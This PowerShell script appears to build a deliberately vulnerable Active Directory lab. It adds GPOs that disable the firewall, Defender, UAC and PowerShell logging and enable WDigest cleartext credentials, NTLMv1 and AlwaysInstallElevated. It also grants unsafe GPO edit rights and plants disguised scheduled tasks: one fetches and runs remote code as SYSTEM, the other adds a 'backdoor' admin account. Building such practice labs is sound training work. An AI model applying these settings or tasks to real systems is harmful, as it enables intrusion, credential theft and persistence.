<#
.SYNOPSIS
    Cree les GPOs (normales + vulnerables)
    Anomalies: firewall off, LLMNR, WPAD, WDigest, NTLMv1, SMB signing off, autorun,
    AlwaysInstallElevated, PowerShell logging off, LSA non PPL, RDP sans NLA,
    credential caching, restricted admin off, LSASS dump, AMSI bypass
#>

param(
    [string]$DomainDN = "DC=lab,DC=local",
    [string]$DomainName = "lab.local"
)

Import-Module GroupPolicy -ErrorAction SilentlyContinue

Write-Host "`n[GPOs] Group Policy Objects..." -ForegroundColor Yellow

# --- GPOs normales ---
$gpos = @(
    @{Name="LAB - Password Policy"; Link="$DomainDN"},
    @{Name="LAB - Audit Policy"; Link="$DomainDN"},
    @{Name="LAB - Desktop Lockdown"; Link="OU=Entreprise,$DomainDN"},
    @{Name="LAB - Drive Mappings"; Link="OU=Entreprise,$DomainDN"},
    @{Name="LAB - Windows Firewall"; Link="$DomainDN"},
    @{Name="LAB - RDP Settings"; Link="OU=Serveurs,$DomainDN"},
    @{Name="LAB - WSUS Client"; Link="$DomainDN"},
    @{Name="LAB - Screen Lock 5min"; Link="OU=Entreprise,$DomainDN"},
    @{Name="LAB - BitLocker"; Link="OU=Postes,$DomainDN"},
    @{Name="LAB - AppLocker"; Link="OU=Postes,$DomainDN"},
    @{Name="LAB - LAPS"; Link="OU=Postes,$DomainDN"}
)

foreach ($gpo in $gpos) {
    try {
        New-GPO -Name $gpo.Name -ErrorAction Stop | Out-Null
        New-GPLink -Name $gpo.Name -Target $gpo.Link -ErrorAction SilentlyContinue | Out-Null
        Write-Host "  -> $($gpo.Name)" -ForegroundColor Green
    } catch { Write-Host "  -> $($gpo.Name) existe deja." -ForegroundColor Gray }
}

# Password policy domaine
try {
    Set-ADDefaultDomainPasswordPolicy -Identity $DomainName -MinPasswordLength 12 -PasswordHistoryCount 24 `
        -MaxPasswordAge (New-TimeSpan -Days 90) -MinPasswordAge (New-TimeSpan -Days 1) -ComplexityEnabled $true `
        -LockoutThreshold 5 -LockoutDuration (New-TimeSpan -Minutes 30) -LockoutObservationWindow (New-TimeSpan -Minutes 30)
    Write-Host "  -> Politique MDP domaine: 12 chars, lockout 5." -ForegroundColor Green
} catch {}

# Audit - taille log
try { Set-GPRegistryValue -Name "LAB - Audit Policy" -Key "HKLM\SYSTEM\CurrentControlSet\Services\EventLog\Security" -ValueName "MaxSize" -Type DWord -Value 209715200 -ErrorAction Stop | Out-Null } catch {}

# ================================================================
# GPOs VULNERABLES
# ================================================================
Write-Host "`n  --- GPOs VULNERABLES ---" -ForegroundColor Red

$vulnGpos = @(
    # --- RESEAU ---
    @{Name="LAB - LEGACY Disable Firewall"; Reg=@(
        @{Key="HKLM\SOFTWARE\Policies\Microsoft\WindowsFirewall\DomainProfile"; Val="EnableFirewall"; Data=0},
        @{Key="HKLM\SOFTWARE\Policies\Microsoft\WindowsFirewall\StandardProfile"; Val="EnableFirewall"; Data=0},
        @{Key="HKLM\SOFTWARE\Policies\Microsoft\WindowsFirewall\PublicProfile"; Val="EnableFirewall"; Data=0}
    ); Tag="FIREWALL OFF"},
    @{Name="LAB - LEGACY LLMNR Enabled"; Reg=@(
        @{Key="HKLM\SOFTWARE\Policies\Microsoft\Windows NT\DNSClient"; Val="EnableMulticast"; Data=1}
    ); Tag="LLMNR ON"},
    @{Name="LAB - LEGACY WPAD Enabled"; Reg=@(
        @{Key="HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\Wpad"; Val="WpadOverride"; Data=0}
    ); Tag="WPAD ON"},
    @{Name="LAB - LEGACY NBT-NS Enabled"; Reg=@(
        @{Key="HKLM\SYSTEM\CurrentControlSet\Services\NetBT\Parameters"; Val="NodeType"; Data=0}
    ); Tag="NBT-NS BROADCAST"},
    # --- AUTHENTIFICATION ---
    @{Name="LAB - LEGACY WDigest Auth"; Reg=@(
        @{Key="HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest"; Val="UseLogonCredential"; Data=1}
    ); Tag="WDIGEST ON (cleartext creds en RAM)"},
    @{Name="LAB - LEGACY NTLMv1 Allowed"; Reg=@(
        @{Key="HKLM\SYSTEM\CurrentControlSet\Control\Lsa"; Val="LmCompatibilityLevel"; Data=1}
    ); Tag="NTLMv1 ALLOWED"},
    @{Name="LAB - LEGACY Credential Caching"; Reg=@(
        @{Key="HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"; Val="CachedLogonsCount"; Data=50}
    ); Tag="50 CACHED LOGONS (defaut 10)"},
    # --- SMB ---
    @{Name="LAB - LEGACY SMB Signing Off"; Reg=@(
        @{Key="HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters"; Val="RequireSecuritySignature"; Data=0},
        @{Key="HKLM\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters"; Val="RequireSecuritySignature"; Data=0},
        @{Key="HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters"; Val="EnableSecuritySignature"; Data=0}
    ); Tag="SMB SIGNING OFF"},
    # --- EXECUTION ---
    @{Name="LAB - LEGACY Autorun Enabled"; Reg=@(
        @{Key="HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer"; Val="NoDriveTypeAutoRun"; Data=0}
    ); Tag="AUTORUN ON"},
    @{Name="LAB - LEGACY AlwaysInstallElevated"; Reg=@(
        @{Key="HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer"; Val="AlwaysInstallElevated"; Data=1},
        @{Key="HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer"; Val="AlwaysInstallElevated"; Data=1}
    ); Tag="ALWAYSINSTALLELEVATED (privesc triviale)"},
    # --- LSA / PROTECTION MEMOIRE ---
    @{Name="LAB - LEGACY LSA Not Protected"; Reg=@(
        @{Key="HKLM\SYSTEM\CurrentControlSet\Control\Lsa"; Val="RunAsPPL"; Data=0}
    ); Tag="LSA NOT PPL (mimikatz friendly)"},
    @{Name="LAB - LEGACY Credential Guard OFF"; Reg=@(
        @{Key="HKLM\SYSTEM\CurrentControlSet\Control\LSA"; Val="LsaCfgFlags"; Data=0},
        @{Key="HKLM\SOFTWARE\Policies\Microsoft\Windows\DeviceGuard"; Val="EnableVirtualizationBasedSecurity"; Data=0}
    ); Tag="CREDENTIAL GUARD OFF"},
    @{Name="LAB - LEGACY WinRS Memory Dump"; Reg=@(
        @{Key="HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest"; Val="Negotiate"; Data=0}
    ); Tag="WDIGEST NEGOTIATE OFF"},
    # --- RDP ---
    @{Name="LAB - LEGACY RDP No NLA"; Reg=@(
        @{Key="HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp"; Val="UserAuthentication"; Data=0},
        @{Key="HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp"; Val="SecurityLayer"; Data=0}
    ); Tag="RDP SANS NLA (BlueKeep-like)"},
    @{Name="LAB - LEGACY Restricted Admin OFF"; Reg=@(
        @{Key="HKLM\SYSTEM\CurrentControlSet\Control\Lsa"; Val="DisableRestrictedAdmin"; Data=1}
    ); Tag="RESTRICTED ADMIN OFF (pass-the-hash RDP)"},
    # --- POWERSHELL / LOGGING ---
    @{Name="LAB - LEGACY No PS Logging"; Reg=@(
        @{Key="HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"; Val="EnableScriptBlockLogging"; Data=0},
        @{Key="HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging"; Val="EnableModuleLogging"; Data=0},
        @{Key="HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription"; Val="EnableTranscripting"; Data=0}
    ); Tag="POWERSHELL LOGGING OFF (pas de detection)"},
    # --- AMSI ---
    @{Name="LAB - LEGACY AMSI Config"; Reg=@(
        @{Key="HKLM\SOFTWARE\Microsoft\AMSI\Providers"; Val="dummy"; Data=0}
    ); Tag="AMSI MISCONFIGURED"},
    # --- WINDOWS DEFENDER ---
    @{Name="LAB - LEGACY Defender Exclusions"; Reg=@(
        @{Key="HKLM\SOFTWARE\Policies\Microsoft\Windows Defender"; Val="DisableAntiSpyware"; Data=1},
        @{Key="HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection"; Val="DisableRealtimeMonitoring"; Data=1}
    ); Tag="WINDOWS DEFENDER OFF"},
    # --- UAC ---
    @{Name="LAB - LEGACY UAC Weak"; Reg=@(
        @{Key="HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"; Val="EnableLUA"; Data=0},
        @{Key="HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"; Val="ConsentPromptBehaviorAdmin"; Data=0},
        @{Key="HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"; Val="FilterAdministratorToken"; Data=0}
    ); Tag="UAC DESACTIVE"},
    # --- AUDIT INSUFFISANT ---
    @{Name="LAB - LEGACY Audit Minimal"; Reg=@(
        @{Key="HKLM\SYSTEM\CurrentControlSet\Services\EventLog\Security"; Val="MaxSize"; Data=1048576}
    ); Tag="SECURITY LOG 1MB ONLY (overflow rapide)"}
)

foreach ($vgpo in $vulnGpos) {
    try {
        $g = New-GPO -Name $vgpo.Name -ErrorAction Stop
        $g | New-GPLink -Target "$DomainDN" -ErrorAction SilentlyContinue | Out-Null
        foreach ($r in $vgpo.Reg) {
            Set-GPRegistryValue -Name $vgpo.Name -Key $r.Key -ValueName $r.Val -Type DWord -Value $r.Data -ErrorAction SilentlyContinue | Out-Null
        }
        Write-Host "  -> [$($vgpo.Tag)] $($vgpo.Name)" -ForegroundColor Red
    } catch { Write-Host "  -> $($vgpo.Name) existe deja." -ForegroundColor Gray }
}

# ================================================================
# GPO PERMISSIONS DANGEREUSES
# ================================================================
Write-Host "`n  --- Permissions GPO dangereuses ---" -ForegroundColor Red

# [GPO modifiable par Authenticated Users]
try {
    Get-GPO -Name "LAB - Drive Mappings" | Set-GPPermission -TargetName "Authenticated Users" -TargetType Group -PermissionLevel GpoEditDeleteModifySecurity -Replace -ErrorAction SilentlyContinue
    Write-Host "  -> [GPO PERM] 'Drive Mappings' modifiable par Authenticated Users!" -ForegroundColor Red
} catch {}

# [GPO modifiable par Domain Users]
try {
    Get-GPO -Name "LAB - Desktop Lockdown" | Set-GPPermission -TargetName "Domain Users" -TargetType Group -PermissionLevel GpoEdit -ErrorAction SilentlyContinue
    Write-Host "  -> [GPO PERM] 'Desktop Lockdown' editable par Domain Users" -ForegroundColor Red
} catch {}

# [GPO liee a un OU mais non enforced / pas de deny]
Write-Host "  -> [GPO PREC] Aucune GPO en mode 'Enforced' (RSOP peut etre override)" -ForegroundColor Yellow

# ================================================================
# SCHEDULED TASKS VIA GPO (persistence)
# ================================================================
Write-Host "`n  --- Taches planifiees suspectes ---" -ForegroundColor Red

try {
    # Creer une tache planifiee qui lance un script avec SYSTEM
    $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ep bypass -nop -c `"IEX (iwr http://192.168.0.10:8080/update.ps1)`""
    $trigger = New-ScheduledTaskTrigger -AtStartup
    $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -RunLevel Highest
    Register-ScheduledTask -TaskName "WindowsUpdate-Check" -Action $action -Trigger $trigger -Principal $principal -Description "Windows Update Verification" -Force -ErrorAction Stop | Out-Null
    Write-Host "  -> [SCHTASK] 'WindowsUpdate-Check' runs as SYSTEM (suspicious IEX)" -ForegroundColor Red
} catch {}

try {
    $action2 = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c net user backdoor Password1 /add && net localgroup Administrators backdoor /add"
    $trigger2 = New-ScheduledTaskTrigger -Daily -At "03:00"
    Register-ScheduledTask -TaskName "Maintenance-Nightly" -Action $action2 -Trigger $trigger2 -Principal $principal -Description "Nightly maintenance task" -Force -ErrorAction Stop | Out-Null
    Write-Host "  -> [SCHTASK] 'Maintenance-Nightly' cree un backdoor user!" -ForegroundColor Red
} catch {}

Write-Host "`n  -> $($gpos.Count + $vulnGpos.Count) GPOs configurees." -ForegroundColor Cyan
